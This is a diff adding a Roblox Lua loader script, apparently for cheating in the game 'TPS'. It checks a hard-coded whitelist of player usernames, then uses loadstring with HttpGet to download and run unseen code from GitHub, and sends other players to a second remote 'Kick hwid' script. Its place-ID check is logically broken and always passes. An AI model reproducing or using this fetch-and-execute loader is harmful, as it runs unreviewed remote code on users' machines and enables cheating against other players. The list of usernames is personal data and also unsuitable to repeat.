@@ -1,0 +1,74 @@
+local whitelist = {
+    "abu_119",
+    "Scope_Reborn",
+    "youropgod",
+    "Adanakerese", --me
+    "sh4d0w_3z",
+    "imaginingj",
+    "qazztr",
+    "orceantro",
+    "NebulaWhisper",
+    "OhhXavier",
+    "iGalaxyKoala_XD",
+    "a_erxksks13",
+    "TpsWafiy",
+    "Edu_nescauucs",
+    "tpsibo_ydk",
+    "N0ct1zX",
+    "momazosMilitopa",
+    "martin_figueroa21",
+    "Zzzshadonwwzz_tt",
+    "maxgabz2", -- 4 din ka mehmaan
+    "a_erxksks13",
+    "RandomTPSMOBILE",
+    "tpsybloodzuser",
+    "LightzUpThemAnkles",
+    "ysjjsu91",
+    "AHMED_YT1233",
+    "xKinq_Fxrce",
+    "vanguardxe",
+    "martin_figueroa21",
+    "boconhairnew", -- 1 din ruk
+    "brunin_la",
+    "dvessayy",
+    "mokaarfa54",
+    "Tps_Strakosha9",
+    "Princeplayz_YTx",
+    "vanguardxe",
+    "Hiivver",
+    "TPS_DUGOL2",
+    "5mdmdUWU",
+    "tps_gkMonster",
+    "Mikecrackexet",
+    "TPS_FLEX",
+    "i8xfr",
+    "dievin55",
+    "JUSIAN_FNF",
+    "Yasinqatar2233",
+    "AnkledByRev",
+    "Tps_Toolz",
+    "RandomTPSMOBILE",
+    "NormalFootballerNF", --limiteditemsking
+    "ALMUTASIMq",
+    "leithina",
+    "vibez_qxys",
+    "Rockifails123456",
+    "xkinq_Fxrce",
+    "jaguarisfast" -- giveaway winner
+}
+
+if table.find(whitelist, game.Players.LocalPlayer.Name) then
+        local id = game.PlaceId
+if id == 335760407 or 13762482705 then
+game.StarterGui:SetCore("SendNotification",{
+			Title = "Loading...";
+			Text = "Loading will take some seconds...";
+			Duration = 5;
+})
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Hcuifhebedi/xufpo0jxjj--/main/Pedjidjdjdhidjm"))()
+else
+    game.Players.LocalPlayer:Kick("It's not TPS SS!")
+end
+else
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yBloodz/TPS-script/main/Kick%20hwid"))();
+end
